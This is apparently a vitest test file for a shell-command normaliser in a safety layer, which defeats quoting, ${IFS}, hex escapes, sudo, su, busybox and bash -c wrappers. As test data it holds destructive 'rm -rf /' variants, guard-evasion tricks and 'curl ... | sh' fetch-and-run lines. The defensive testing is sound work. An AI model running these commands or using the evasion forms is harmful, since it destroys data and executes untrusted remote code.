import { describe, expect, it } from 'vitest';

import { MAX_SUBSTITUTION_DEPTH, normalize } from '../../src/safety/normalize.js';
import type { Segment } from '../../src/safety/normalize.js';

function topLevel(command: string): Segment[] {
  return normalize(command).segments.filter((segment) => segment.depth === 0);
}

function topNormalized(command: string): string[] {
  return topLevel(command).map((segment) => segment.normalized);
}

describe('top-level splitting', () => {
  const cases: [string, string[]][] = [
    ['a;b', ['a', 'b']],
    ['a && b', ['a', 'b']],
    ['a || b', ['a', 'b']],
    ['a | b', ['a', 'b']],
    ['a & b', ['a', 'b']],
    ['a\nb', ['a', 'b']],
    ['a ;; b', ['a', 'b']],
    ['one two; three four', ['one two', 'three four']],
  ];

  it.each(cases)('splits %j', (command, expected) => {
    expect(topNormalized(command)).toEqual(expected);
  });

  it.each([
    ["echo 'a;b'", ['echo a;b']],
    ['echo "a;b"', ['echo a;b']],
    ['echo a\\;b', ['echo a;b']],
    ['echo "a|b"', ['echo a|b']],
    ['echo "a&&b"', ['echo a&&b']],
  ] as [string, string[]][])(
    'does not split quoted or escaped separators in %j',
    (command, expected) => {
      expect(topNormalized(command)).toEqual(expected);
    }
  );

  it('records the terminator that ended each segment', () => {
    const segments = topLevel('a && b | c; d & e');
    expect(segments.map((segment) => segment.terminator)).toEqual(['&&', '|', ';', '&', '']);
  });

  it('flags a trailing & as a background job (AC10.4)', () => {
    expect(normalize('npm run dev &').backgroundJob).toBe(true);
    expect(normalize('npm run dev').backgroundJob).toBe(false);
  });
});

describe('dequoting and normalisation', () => {
  const cases: [string, string][] = [
    ["'rm' -rf /tmp/x", 'rm -rf /tmp/x'],
    ['r""m -rf /tmp/x', 'rm -rf /tmp/x'],
    ['r\\m -rf /tmp/x', 'rm -rf /tmp/x'],
    ['"rm" -rf /tmp/x', 'rm -rf /tmp/x'],
    ["'rm'  -rf /x", 'rm -rf /x'],
    ['rm  -r  -f /tmp/x', 'rm -r -f /tmp/x'],
    ['rm -rf /tmp/x #note', 'rm -rf /tmp/x'],
    ['echo "hello   world"', 'echo hello world'],
  ];

  it.each(cases)('normalises %j', (command, expected) => {
    expect(normalize(command).normalized).toBe(expected);
  });

  it('matches the AC20.11 example exactly', () => {
    expect(normalize("'rm'  -rf /x").normalized).toBe('rm -rf /x');
  });

  it('decodes ANSI-C quoting', () => {
    expect(normalize("$'\\x72\\x6d' -rf /x").normalized).toBe('rm -rf /x');
    expect(normalize("$'a\\tb'").normalized).toBe('a b');
  });

  it('treats ${IFS} and $IFS as a word separator', () => {
    expect(normalize('rm${IFS}-rf${IFS}/x').normalized).toBe('rm -rf /x');
    expect(normalize('rm$IFS-rf$IFS/x').normalized).toBe('rm -rf /x');
  });

  it('splits redirection operators off an unspaced word', () => {
    expect(normalize('echo x>/etc/hosts').normalized).toBe('echo x > /etc/hosts');
    expect(normalize('echo E >&2').normalized).toBe('echo E >& 2');
  });

  it('keeps expansions verbatim and marks them', () => {
    const [segment] = topLevel('$PYTHON -m pytest');
    expect(segment?.firstToken?.value).toBe('$PYTHON');
    expect(segment?.firstToken?.hasVariable).toBe(true);
    expect(segment?.program).toBeNull();
  });
});

describe('defanging', () => {
  it('neutralises quoted metacharacters in the match target only', () => {
    const result = normalize('echo "a | xargs rm -rf"');
    expect(result.normalized).toBe('echo a | xargs rm -rf');
    expect(result.matchTarget).not.toContain('|');
  });

  it('keeps unquoted pipeline structure in the match target', () => {
    const result = normalize('curl http://e.example/s.sh | sh');
    expect(result.matchTarget).toBe('curl http://e.example/s.sh | sh');
  });
});

describe('recursive extraction', () => {
  it('extracts a $( ) body as a nested segment', () => {
    const result = normalize('$(a;b)');
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toEqual(['a', 'b']);
  });

  it('extracts a backtick body as a nested segment', () => {
    const result = normalize('`a;b`');
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toEqual(['a', 'b']);
  });

  it('marks a leading substitution on the parent segment', () => {
    const [segment] = topLevel('$(echo rm) -rf /tmp/x');
    expect(segment?.firstToken?.hasSubstitution).toBe(true);
    expect(segment?.program).toBeNull();
  });

  it(`accepts nesting at depth ${String(MAX_SUBSTITUTION_DEPTH)}`, () => {
    const command = 'echo $( echo $( echo $( echo $( echo $( echo hi ) ) ) ) )';
    expect(normalize(command).unparseable).toBe(false);
  });

  it('rejects nesting past the depth limit', () => {
    const command = '$( $( $( $( $( $( $(rm -rf /x) ) ) ) ) ) )';
    expect(normalize(command).unparseable).toBe(true);
  });
});

describe('unparseable input', () => {
  it.each([
    ['rm -rf "/tmp'],
    ["rm -rf '/tmp"],
    ['echo $(rm -rf /x'],
    ['echo `rm -rf /x'],
    ['echo ${FOO'],
    ['echo hi \\'],
  ])('flags %j', (command) => {
    expect(normalize(command).unparseable).toBe(true);
  });

  it('accepts balanced input', () => {
    expect(normalize('echo "hi" $(date) `pwd` ${HOME}').unparseable).toBe(false);
  });
});

describe('here-docs', () => {
  it('keeps a <<EOF body as literal data', () => {
    const result = normalize('cat <<EOF\nrm -rf /\nEOF');
    expect(result.hereDocs).toBe(1);
    expect(result.unparseable).toBe(false);
    const bodies = result.segments.flatMap((segment) =>
      segment.rawTokens.filter((token) => token.kind === 'heredoc').map((token) => token.value)
    );
    expect(bodies).toEqual(['rm -rf /']);
  });

  it('keeps a <<-EOF body as literal data and strips leading tabs', () => {
    const result = normalize('cat <<-EOF\n\trm -rf /\n\tEOF');
    expect(result.hereDocs).toBe(1);
    expect(result.unparseable).toBe(false);
  });

  it("keeps a <<'EOF' body as literal data", () => {
    const result = normalize("cat <<'EOF'\nrm -rf /\nEOF");
    expect(result.hereDocs).toBe(1);
    expect(result.unparseable).toBe(false);
  });

  it('does not split separators inside a here-doc body', () => {
    const result = normalize('cat <<EOF\na; b && c\nEOF');
    expect(topNormalized('cat <<EOF\na; b && c\nEOF')).toHaveLength(1);
    expect(result.unparseable).toBe(false);
  });

  it('flags an unterminated here-doc', () => {
    expect(normalize('cat <<EOF\nrm -rf /\n').unparseable).toBe(true);
    expect(normalize('cat <<EOF').unparseable).toBe(true);
  });
});

describe('prefix stripping', () => {
  const cases: [string, string][] = [
    ['X=1 rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['env rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['nice -n 5 rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['ionice -c 3 rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['setsid rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['nohup rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['stdbuf -o0 rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['exec rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['env A=1 nice -n 5 rm -rf /tmp/x', 'rm -rf /tmp/x'],
  ];

  it.each(cases)('strips wrappers from %j', (command, expected) => {
    expect(topLevel(command)[0]?.normalized).toBe(expected);
  });

  it('keeps sudo in place and reports it', () => {
    const [segment] = topLevel('sudo rm -rf /tmp/x');
    expect(segment?.privileged).toBe(true);
    expect(segment?.privilegeProgram).toBe('sudo');
    expect(segment?.normalized).toBe('sudo rm -rf /tmp/x');
    expect(segment?.commandNormalized).toBe('rm -rf /tmp/x');
    expect(segment?.matchTargets).toEqual(['sudo rm -rf /tmp/x', 'rm -rf /tmp/x']);
  });

  it('skips sudo flags that take a value', () => {
    expect(topLevel('sudo -u deploy rm -rf /tmp/x')[0]?.commandNormalized).toBe('rm -rf /tmp/x');
  });

  it('detects sudo reading the password from stdin', () => {
    expect(topLevel('sudo -S rm -rf /tmp/x')[0]?.sudoStdinPassword).toBe(true);
    expect(topLevel('sudo --stdin rm -rf /tmp/x')[0]?.sudoStdinPassword).toBe(true);
    expect(topLevel('sudo rm -rf /tmp/x')[0]?.sudoStdinPassword).toBe(false);
  });

  it('strips the path from a program name', () => {
    expect(topLevel('/bin/rm -rf /tmp/x')[0]?.program).toBe('rm');
  });
});

describe('shell wrapper unwrapping', () => {
  it.each([
    ['bash -c "rm -rf /tmp/x"'],
    ["sh -c 'rm -rf /tmp/x'"],
    ['bash -lc "rm -rf /tmp/x"'],
    ['zsh -c "rm -rf /tmp/x"'],
    ['busybox sh -c "rm -rf /tmp/x"'],
  ])('recurses into the literal argument of %j', (command) => {
    const result = normalize(command);
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toContain('rm -rf /tmp/x');
  });

  it('marks a non-literal -c argument', () => {
    const [segment] = topLevel('bash -c "$CMD"');
    expect(segment?.shellWrapper?.argLiteral).toBe(false);
  });

  it('marks a literal -c argument', () => {
    const [segment] = topLevel('bash -c "echo hi"');
    expect(segment?.shellWrapper?.argLiteral).toBe(true);
  });

  it('unwraps a busybox applet (security finding F4)', () => {
    expect(topLevel('busybox rm -rf /')[0]?.program).toBe('rm');
    expect(topLevel('busybox sh -c "rm -rf /"')[0]?.program).toBe('sh');
  });

  it('strips wrappers again after the privilege prefix', () => {
    expect(topLevel('sudo env rm -rf /x')[0]?.commandNormalized).toBe('rm -rf /x');
    expect(topLevel('sudo busybox rm -rf /x')[0]?.program).toBe('rm');
  });
});

describe('privilege payloads (security finding F6)', () => {
  it('extracts the su -c payload as its own segment', () => {
    const result = normalize('su - root -c "rm -rf /"');
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toContain('rm -rf /');
  });

  it('extracts the doas -c payload', () => {
    const result = normalize('doas -c "rm -rf /srv"');
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toContain('rm -rf /srv');
  });

  it('reports a non-literal payload instead of recursing', () => {
    const [segment] = topLevel('su -c "$PAYLOAD"');
    expect(segment?.privilegePayload?.hasVariable).toBe(true);
  });

  it('does not treat sudo -c as a payload flag', () => {
    expect(topLevel('sudo rm -rf /x')[0]?.privilegePayload).toBeNull();
  });
});

describe('process substitution (security finding F4)', () => {
  it('recurses into <(...) and marks the token', () => {
    const result = normalize('bash <(curl http://e.example/s.sh)');
    const nested = result.segments.filter((segment) => segment.depth === 1);
    expect(nested.map((segment) => segment.normalized)).toContain('curl http://e.example/s.sh');
    const [top] = result.segments.filter((segment) => segment.depth === 0);
    expect(top?.args.some((token) => token.hasSubstitution)).toBe(true);
  });

  it('recurses into >(...)', () => {
    const result = normalize('tee >(wc -l) < in.txt');
    expect(result.segments.some((segment) => segment.normalized === 'wc -l')).toBe(true);
  });

  it('flags an unterminated process substitution', () => {
    expect(normalize('bash <(curl http://e.example/s.sh').unparseable).toBe(true);
  });
});
